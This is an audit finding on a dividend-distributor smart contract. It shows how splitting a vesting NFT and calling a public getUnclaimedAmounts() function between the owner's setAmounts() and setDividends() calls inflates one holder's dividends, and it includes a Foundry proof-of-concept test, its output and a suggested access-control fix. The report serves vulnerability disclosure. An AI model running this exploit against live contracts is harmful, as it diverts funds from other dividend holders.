# [000530] Splitting of TVS will result in increased dividend payments.
  
  ## Summary

A user can apply a trick to get more dividends by splitting TVS and calling `getUnclaimedAmounts()` before `setAmounts()` and after `setDividends()`.



## Root cause

When the `owner` calls the `setAmounts()` function to collect information about the total unclaimed amounts, the `getTotalUnclaimedAmounts()` function will be called. This function enumerates all NFT IDs and gets `unclaimedAmountsIn` for each NFT in the `getUnclaimedAmounts()` function.

https://github.com/dualguard/2025-11-alignerz/blob/f7eeed88d91356484c02af6f38b71f27b790828c/protocol/src/contracts/A26ZDividendDistributor/A26ZDividendDistributor.sol#L140-L161

```solidity
function getUnclaimedAmounts(uint256 nftId) public returns (uint256 amount) {
// ...

        uint256 claimedAmount = claimedSeconds[i] * amounts[i] / vestingPeriods[i];
        uint256 unclaimedAmount = amounts[i] - claimedAmount;
        amount += unclaimedAmount;
        unchecked {
            ++i;
        }
    }
@=>    unclaimedAmountsIn[nftId] = amount;
}
```



This `unclaimedAmountsIn`  is used for dividend calculation in the function `_setDividends()`

https://github.com/dualguard/2025-11-alignerz/blob/f7eeed88d91356484c02af6f38b71f27b790828c/protocol/src/contracts/A26ZDividendDistributor/A26ZDividendDistributor.sol#L214-L224

```solidity
function _setDividends() internal {
        uint256 len = nft.getTotalMinted();
        for (uint i; i < len;) {
            (address owner, bool isOwned) = safeOwnerOf(i);
@=>            if (isOwned) dividendsOf[owner].amount += (unclaimedAmountsIn[i] * stablecoinAmountToDistribute / totalUnclaimedAmounts);
            unchecked {
                ++i;
            }
        }
        emit dividendsSet();
    }
```



Because `getUnclaimedAmounts()` is public, users can call it themselves with a certain `nftId`. 

A malicious user can observe the `setAmounts()` transaction, then before the `setDividends()`, call `splitTVS()`  with `[0, 10_000]` percentages to mint a new NFT and call `getUnclaimedAmounts` for the new NFT ID. This trick allows malicious users to receive more dividends.



## Attack Path

- Observe when the  `setAmounts()` transaction will be confirmed.
- Initiate transaction `splitTVS()` with `[0, 10_000]` percentages and get new NFT ID.
- Call `getUnclaimedAmounts()` with a new NFT as an argument.
- Wait until the owner calls `setDividends()`.
- Claim dividends by `claimDividends()`.





## Impact

This attack allows malicious users to receive more dividends by redistributing the funds of the contract. Other participants will receive less funds. 

However, this attack is a bit complicated, as the attacker must call their transactions between the owner's calls. Besides, the owner can use the `setUpTheDividends()` function instead of two separate calls, which makes this attack impossible.



## Proof Of Concept

Add a test `test/AlignerzVestingProtocolTest.t.sol`

```solidity
    function test_getMoreDividends() public {
        vm.startPrank(projectCreator);
        vesting.setVestingPeriodDivisor(1);

        // 1. Launch project
        vm.startPrank(projectCreator);
        vesting.launchBiddingProject(address(token), address(usdt), block.timestamp, block.timestamp + 1_000_000, "0x0", true);

        // 2. Create multiple pools with different prices
        vesting.createPool(PROJECT_ID, 3_000_000 ether, 0.01 ether, true);
        vesting.createPool(PROJECT_ID, 3_000_000 ether, 0.02 ether, false);
        vesting.createPool(PROJECT_ID, 4_000_000 ether, 0.03 ether, false);


        // 3. Place bids from different whitelisted users
        vesting.addUsersToWhitelist(bidders, PROJECT_ID);
        vm.stopPrank();
        for (uint256 i = 0; i < NUM_BIDDERS; i++) {
            vm.startPrank(bidders[i]);

            // Approve and place bid
            usdt.approve(address(vesting), BIDDER_USD);

            // Different vesting periods to test variety
            uint256 vestingPeriod = (i % 3 == 0) ? 90 days : (i % 3 == 1) ? 180 days : 365 days;

            vesting.placeBid(PROJECT_ID, BIDDER_USD, vestingPeriod);
            vm.stopPrank();
        }

         // 4. Update some bids
        vm.prank(bidders[0]);
        vesting.updateBid(PROJECT_ID, BIDDER_USD, 180 days);

        // 5. Prepare bid allocations (this would be done off-chain)
        BidInfo[] memory allBids = new BidInfo[](NUM_BIDDERS);

        // Simulate off-chain allocation process
        for (uint256 i = 0; i < NUM_BIDDERS; i++) {
            // Assign bids to pools (in reality, this would be based on some algorithm)
            uint256 poolId = i % 3;
            bool accepted = i < 15; // First 15 bidders are accepted

            allBids[i] = BidInfo({
                bidder: bidders[i],
                amount: BIDDER_USD, // For simplicity, all bids are the same amount
                vestingPeriod: (i % 3 == 0) ? 90 days : (i % 3 == 1) ? 180 days : 365 days,
                poolId: poolId,
                accepted: accepted
            });
        }

        // 6. Generate merkle roots for each pool
        bytes32[] memory poolRoots = new bytes32[](3);
        for (uint256 poolId = 0; poolId < 3; poolId++) {
            poolRoots[poolId] = generateMerkleProofs(allBids, poolId);
        }

        // 7. Generate refund proofs
        refundRoot = generateRefundProofs(allBids);

        // 8. Finalize project with merkle roots
        vm.prank(projectCreator);
        vesting.finalizeBids(PROJECT_ID, refundRoot, poolRoots, 60);
        uint256[] memory nftIds = new uint256[](15);
        // 9. Users claim NFTs with proofs
        for (uint256 i = 0; i < 15; i++) {
            // Only accepted bidders
            address bidder = bidders[i];
            uint256 poolId = bidderPoolIds[bidder];

            vm.prank(bidder);
            uint256 nftId = vesting.claimNFT(PROJECT_ID, poolId, BIDDER_USD, bidderProofs[bidder]);
            nftIds[i] = nftId;
            bidderNFTIds[bidder] = nftId;

            // Verify NFT ownership
            assertEq(nft.ownerOf(nftId), bidder);
        }

        address evilBidder = bidders[0];

        vm.startPrank(owner);
        usdt.transfer(address(distributor), 1000);
        distributor.setAmounts();
        distributor.setDividends();
        vm.stopPrank();

		console.log("contract balance:", usdt.balanceOf(address(distributor)));
        console.log("dividends before: ", distributor.getDividendOf(evilBidder));

        vm.startPrank(evilBidder);
        uint256[] memory percentages = new uint256[](2);
        percentages[0] = 0;
        percentages[1] = 10_000;

        (uint256 oldNft, uint256[] memory newNft) = vesting.splitTVS(PROJECT_ID, percentages, bidderNFTIds[evilBidder]);

        distributor.getUnclaimedAmounts(newNft[0]);

        vm.stopPrank();

        vm.prank(owner);
        distributor.setDividends();

        console.log("dividends after: ", distributor.getDividendOf(evilBidder));
    }

```

We get the output

```bash
[PASS] test_getMoreDividends() (gas: 21164519)
Logs:
  contract balance: 1000
  dividends before:  66
  dividends after:  198

```


## Mitigation

Restrict access to the`getUnclaimedAmounts()` function for the owner only.

  